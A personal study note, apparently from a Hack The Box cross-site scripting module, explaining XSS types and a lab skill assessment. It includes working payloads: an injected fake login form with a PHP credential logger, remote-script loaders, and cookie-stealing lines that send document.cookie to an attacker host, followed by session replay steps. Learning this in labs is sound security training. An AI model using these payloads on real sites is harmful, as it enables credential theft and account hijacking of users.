# XSS Types

There are three main types of XSS vulnerabilities:

|Type|Description|
|---|---|
|`Stored (Persistent) XSS`|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|`Reflected (Non-Persistent) XSS`|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|`DOM-based XSS`|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|

# Stored XSS

```html
<script>alert(window.origin)</script>
```

If the target is vulnerable to this type of attack, when we refresh the page, the alert will displayed again, because is stored on the back-end database and is displayed every time is retrieved.
# Reflected XSS

```html
<script>alert(window.origin)</script>
```
This type of attack is less dangerous than the stored. To check if the target is vulnerable to reflected, we need to look for network tab, to see if there's traffick. If traffick is there, like GET requests, it means there's some type of communication with the back-end server. What we can do is store the URL and send it to a victim, if he/she clicks on the URL, then the payload will be executed.
# Dom XSS

```html
<img src="" onerror=alert(window.origin)>
```

In this type of attack, there is no communication with the back-end, since the input is completely processed on the client-side throught javascript. If we check the network traffick, there should be none. For this attack, we should ook for the `Sink`, or rather a function that writes the user input to a DOM object on the page:
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`
Or with `jQuery`:
- `add()`
- `after()`
- `append()`
The `Source` is the javascript object that takes the user input (for example in a GET request, it could be "task= ...", where 'task' is the source.) An example:

This is the `Source` ("task=")
```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Right below these lines, we see that the page uses the `innerHTML` function to write the `task` variable in the `todo` DOM:

```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

The code above is the `Sink`. 
For this attack we can do the same thing we did for the reflected with the URL thing.
# XSS Discovery
We can use Web Application Vulnerability Scanners (Nessus, Burp Pro (premium), Zap). We could also use open-source tools like [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser) (i'd use XSStrike). 

```shell-session
Poiint@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

For manual discovery, check this good resources/payloads:
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) 
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)



# Phishing
If the target is vulnerable to XSS, it means that we can "deface" a website or we can modify it in order to do a phishing attack. We can add a form that once completed will be returned to our ip address:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP> #CHANGE THIS !!!
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Once we find an XSS payload that works, we can use this payload to inject the login form:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

for example:

```javascript
<script> document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>'); </script>
```

We could also remove some parts of the website in order to make it more appealing with this code:

```javascript
document.getElementById('urlform').remove();
# We can look for IDs in the source page
```

At this point we need to start a listener with `netcat` for example. If the victim will complete and send the login form compilated, we will receive something like this:

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

A problem with that is once the form is sended, the page doesn't do anything and this can be suspicious, what we can do is redirect the victim to a page using a php script like this one:

index.php:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

At this point we can start a PHP server like this:
```shell-session
Poiint@htb[/htb]$ sudo php -S 0.0.0.0:80
```
and wait for a login form sent.

# Session Hijacking
`Session Hijacking` (aka `Cookie Stealing`) is an attack that focus on stealing another user's cookie in order to be able to navigate using his session. In case of a `Blind XSS`.
In case we see a user/login form, we can test each field name if it's vulnerable for XSS, by using a payload in each field name. For example, if the form has "username", "fullname", "email", "password" and "imgurl", we can use a payload like this

```html
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
#And so on...
```

Of course, the XSS payload could not be exactly this one, here are some of them:
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Once we got all of them, we can start a PHP listener (or a netcat) and then send the form. If we receive a GET request, we should look for the last part of the URL and we will know what is the field name that is vulnerable to XSS. Now that we know the field (and the XSS payload) which is vulnerable, we can use a payload that steals the cookie: 

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
# The second one is better because less suspicious
```

For example, we can save the second payload in a file called `script.js`. Now in the form, in the vulnerable field name, we can paste and enter this payload: 

```html
<script src=http://OUR_IP/script.js></script>
```

This will call our script. If you noticed, the script will call another file, `index.php`, so we need to create also this file. 'Index.php' could be something like this:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Now we can run the attack. If everything went well, we will receive something like this in our PHP listener:

```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

So we succesfully got a cookie. Now, to set a cookie in our browser, we can go in the developer tools (F12) -> Storage -> + button -> Name = cookie, Value = f904f93c949d19d870911bf8b05fe7b2 -> Refresh page.
Now we have the cookie session of our victim.

# Skill Assessment
It was very easy, but i got into a rabbit hole. There was a search form that was filtering characters like '<', '>', '"''"' and so on... 
I tried to bypass that filter but without success (i just think it's not possible, i tried a lot of payloads). In the source page i could see that '<' was being filtered with '&lt' and the same for the other characters. So after a while i decided to look for other forms in the page and there was one that was like a login form. I used the same technique in [[16a. CrossSiteScriptingXSS_notes#Session Hijacking]] so i have tested which field name was vulnerable (it was the last one, i don't remember the name), once i got it i created the `script.js` and `index.php` file, i compiled them with the right IP (remember to do it!!), started a PHP listener and then, on the vulnerable field name, i pasted that payload:
<script src=http://OUR_IP/script.js></script>
All went smooth and i got a cookie that inside contained a htb flag.
EXTRA: a thing i noticed while being in the rabbit hole is that i run XSS Strike and it said that my get request was vulnerable, he also outputted what was the function (remember the `Sink` functions!) that was vulnerable and it was like a wordpress thing. At first i didn't understand it, but once i found the second login form it had something to do with wordpress so the two things were probably connected. So when running XSS Strike look what the output is and try to locate it in the source page or in the network tab, maybe you cna find exactly what form is vulnerable.